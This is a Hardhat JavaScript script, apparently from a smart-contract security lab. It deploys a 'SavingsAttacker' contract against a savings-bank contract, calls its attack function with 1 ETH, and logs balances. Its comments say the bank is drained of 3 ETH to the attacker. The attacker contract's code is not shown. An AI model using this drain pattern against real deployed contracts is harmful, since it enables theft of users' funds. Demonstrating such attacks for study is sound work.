// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.

const { logtime } = require("./libraries/timelogger");
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers");
const { ethers } = require("hardhat");
const fs  = require("fs");

const savingsBankAddress = fs.readFileSync('./temp_files/contract_address.txt', 'utf8');

async function main() {
  logtime();
  const accounts = await ethers.getSigners();
  const contractOwner = accounts[0];
  const attackerFactory = await ethers.getContractFactory("SavingsAttacker");
  const attacker = await attackerFactory.deploy(savingsBankAddress);
  await attacker.waitForDeployment();
  console.log("Bad contract deployed");
  // await new Promise(r => setTimeout(r, 50000));

  balanceETH = await ethers.provider.getBalance(savingsBankAddress);
  console.log("Initial balance of savings bank: ", balanceETH.toString());

  tx = await attacker.connect(contractOwner).attack({
         value: parseEther("1"),
       });
  await tx.wait();

  console.log("Attack Executed");
  // Balance of the savingsBank's address is now zero
  balanceETH = await ethers.provider.getBalance(savingsBankAddress);
  console.log("Balance of savings bank (should be 0): ", balanceETH.toString());

  // Balance of attacker is now 4 ETH (3 ETH stolen + 1 ETH from attacker)
  balanceETH = await ethers.provider.getBalance(await attacker.getAddress());
    console.log("Balance of attacker (should be 4): ", balanceETH.toString());
  logtime();
}
 
// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
